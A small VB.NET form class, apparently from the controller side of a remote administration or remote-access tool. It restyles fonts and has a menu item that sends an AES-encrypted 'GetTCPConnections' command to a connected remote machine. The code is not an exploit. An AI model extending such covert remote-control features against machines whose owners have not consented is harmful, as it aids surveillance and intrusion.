Public Class FormTCPconn
    Public connected As Connection
    Private Sub ChangeFont(ByVal container As Control)
        For Each ctrl As Control In container.Controls
            ' Change font for the control
            ctrl.Font = New Font("Comic Sans MS", 9, FontStyle.Regular)

            ' If the control has children, recursively change their fonts
            If ctrl.HasChildren Then
                ChangeFont(ctrl)
            End If
        Next
    End Sub
    Private Sub ToolStripMenuItem3_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ToolStripMenuItem3.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("GetTCPConnections", Form1.enckey))
        Catch
        End Try
    End Sub

    Private Sub FormTCPconn_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        ChangeFont(Me)

    End Sub
End Class